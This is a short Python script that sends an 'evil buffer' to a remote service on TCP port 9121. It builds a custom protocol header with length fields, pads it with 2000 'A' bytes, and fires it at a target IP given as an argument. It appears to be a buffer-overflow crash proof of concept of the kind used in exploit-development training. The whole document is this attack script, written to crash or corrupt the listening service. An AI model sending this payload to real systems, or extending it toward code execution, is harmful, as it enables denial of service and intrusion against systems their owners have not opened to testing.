#!/usr/bin/python
import socket
import sys
from struct import pack

try:
    server = sys.argv[1]
    port = 9121
    size = 2000

    inputBuffer = b"\x41" * size

    header =  b"\x75\x19\xba\xab"
    header += b"\x03\x00\x00\x00"
    header += b"\x00\x40\x00\x00"
    header += pack('<I', len(inputBuffer))
    header += pack('<I', len(inputBuffer))
    header += pack('<I', inputBuffer[-1])

    buf = header + inputBuffer

    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()

    print("Done!")

except IndexError:
    print(f"Usage: {sys.argv[0]} <target_ip>")
except socket.error:
    print("could not connect!")
    
